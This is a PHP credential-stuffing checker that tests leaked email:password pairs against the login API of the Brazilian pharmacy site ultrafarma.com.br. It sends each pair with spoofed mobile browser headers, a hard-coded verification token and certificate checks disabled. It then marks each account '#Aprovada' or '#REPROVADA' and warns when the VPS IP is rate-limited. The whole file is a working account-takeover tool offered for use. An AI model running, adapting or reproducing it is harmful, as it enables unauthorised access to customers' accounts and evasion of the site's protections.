<?php 
error_reporting(0); 
 
extract($_GET); 
 
function getStr($string, $start, $end) 
{ 
    $str = explode($start, $string); 
    $str = explode($end, $str[1]); 
    return $str[0]; 
} 


function multiexplode($string) {
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
   }


   $lista = $_GET['lista'];
   $email = multiexplode($lista)[0];
   $senha = multiexplode($lista)[1];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.ultrafarma.com.br/api/login');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: www.ultrafarma.com.br';
$headers[] = 'requestverificationtoken: rt0fIikYEASm3my6Wah1BeYVBmU88NEIP5PYkvMDpGXzAq04R2gHoFAso6l3mTPxXFhhFSshaJ2ZyrMViYnjM48xvdDu6pXRaB9hxIldgZk1:GbFRVLE_gSkuM_CN45LTxEVuGN_PVniScsIviLtAf62w0uRJA1ZVtN8QHfQRjKBMmSVLFhB534c_4UALT6JhAbaql0cp0ZMguNeD4j7TT9Y1';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36';
$headers[] = 'origin: https://www.ultrafarma.com.br';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://www.ultrafarma.com.br/identificacao?ReturnUrl=%2fcentral-do-cliente%2fpedidos';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"login":"'.$email.'","senha":"'.$senha.'","manterConectado":false}');
$curl = curl_exec($ch);


if(strpos($curl,'Você atingiu o limite de acessos')){
  echo "IP DA VPS TA LIMITADO NO SITE. ESPERE 5/10 MIN.";
  }else{
    if(strpos($curl,'email')){
      echo "<div class='badge badge-success'>#Aprovada</div> <b class='badge badge-primary'>CONTA: $lista</b><span class='badge badge-primary'>@kozune</span></p>";
      }else{
    
    echo "<div class='badge badge-danger'>#REPROVADA</div> <b class='badge badge-primary'>CONTA: $lista</b> 
    <span class='badge badge-light'>@kozune</span></p>";
    }
  }
?>  